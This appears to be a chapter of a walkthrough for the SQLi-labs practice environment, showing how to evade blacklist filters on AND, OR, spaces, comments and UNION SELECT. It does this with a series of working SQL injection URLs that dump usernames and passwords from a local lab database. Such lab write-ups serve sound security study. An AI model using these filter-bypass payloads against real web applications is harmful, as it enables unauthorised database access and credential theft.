# Chapter-09

## Bypassing blacklist filters

This section will be about bypassing blacklist filters. 

### Lesson 25

In this challenge the ```AND``` and the ```OR``` keyword have been filtered. This means that we cannot use ```AND``` or ```OR``` to perform SQL injections. 

The workaround for this is to use logical ```AND``` and ```OR``` operators, i.e ```&&``` and ```||```. Logical operators will work fine for these challenges. 

We can get the username and password by running the following command - 

```sql 
/sqlilabs/Less-25/?id=0'union select 1, group_concat(passwoorrd), group_concat(username) from users --+
```

:warning: Since, the ```OR``` and ```AND``` are being removed from the query, ```oorr``` can be used for table and column names that contain ```OR``` and ```AND```. 

:boom: Also to make use of ```||``` and ```&&``` will have to be url encoded. 

### Lesson 25a

This challenge is a bit tricky, as might miss the obvious here. In this challenge ```AND``` and ```OR``` have been blacklisted. 

When we try to break the query here, we'll soon realise that it cannot be broken as the input is sent as is. There is no ```'``` or ```"``` enclosing the input. We can find this out by trying out the below mentioned test - 

```sql 
https://localhost//sqlilabs/Less-25a/?id=1 %26%26 1 --+

https://localhost//sqlilabs/Less-25a/?id=1 %26%26 0 --+
```
We can see the output when we ```AND``` the query with 1 and we are unable to see the query when we ```AND``` it with 0. 

Now, we can get the usernames and passwords by entering this in the url - 

```sql
https://localhost/sqlilabs/Less-25a/?id=-1 union select 1, group_concat(username), group_concat(passwoorrd) from users limit 0, 1 --+
```

:warning: The output for ```UNION SELECT``` can only be seen if the preceeding query is invalid. 

### Lesson 26

This challenge has even more restrictions. Here the following will be removed from the input - 

1.  ```AND```
1.  ```OR```
1.  Spaces and comments

However, there is a workaround for cases where spaces are removed from the input. MySql tends to accept certain non-printable values like ```%a0```, ```%b0``` in the place of spaces. Therefore, ```%a0```, ```%b0``` can be used instead of spaces.

Another workaround for space filtering is to use parenthesis. Parenthesis can also be used to escape space filtering. 

Here is an example which shows both the above mentioned hacks - 

```sql
union(select(1),(2),(3))

union %a0 select %a0 1,2,3 
```

Also, since comments are filtered, we will have balance the query using ```&&``` and ```||``` operators.

The url will look somewhat like this - 

```sql 
http://localhost/sqlilabs/Less-26/?id=0' union %a0 select %a0 1,2,3 %a0 %26%26 '1
```

### Lesson 26a 

This challenge is exactly the same as lesson26 with the only difference being how the input is wrapped in the sql query. 

The url for this challenge looks somewhat like this - 

```sql
http://localhost/sqlilabs/Less-26a/?id=1') union %a0 select %a0 1,2,3 %a0 %26%26 ('1
```

Here's a funny thing about this challenge, when you try to check for the validity of ```1'``` with the ```&&``` operator, it will come out to be true. 

i.e. if you type the following in the url you will see the desired result (i.e. the website shows nothing when the boolean value is evaluated to false and the website shows some information when the boolean value is evaluated to true).

```
http://localhost/sqlilabs/Less-26a/?id=1' %26%26 '1
http://localhost/sqlilabs/Less-26a/?id=1' %26%26 '0


SELECT * FROM users WHERE id=('1999' union select 1, 2, 3 && '1') LIMIT 0,1; [Backend query]
```

and

```
http://localhost/sqlilabs/Less-26a/?id=1') %26%26 ('1
http://localhost/sqlilabs/Less-26a/?id=1') %26%26 ('0

SELECT * FROM users WHERE id=('199') union select 1, 2, 3 && ('0') LIMIT 0,1; [Backend query]
```

Both the above mentioned queries will show similar results for the above attack. But they will differ when ```union select``` statement is used. 

### Lesson 27 

```
/sqlilabs/Less-27/?id=' %a0 uNion %a0 sElect %a0 1,2,3 %a0 or %a0 '1
```

### Lesson 27a

```
/sqlilabs/Less-27a/?id=" %a0 uNiOn %a0 sEleCt %a0 1,database(),3%a0 and  %a0 "1
```

### Lesson 28

```
/sqlilabs/Less-28/?id=1999') %a0 union %a0 select %a0 1,2,3 %a0 or %a0 ('1
```

### Lesson 28a

The space between union and select. The program is removing ```union select``` together. 

```
/sqlilabs/Less-28a/?id=6') %a0 uNiOn%a0sEleCt %a0 1, 1, 2 or ('0
```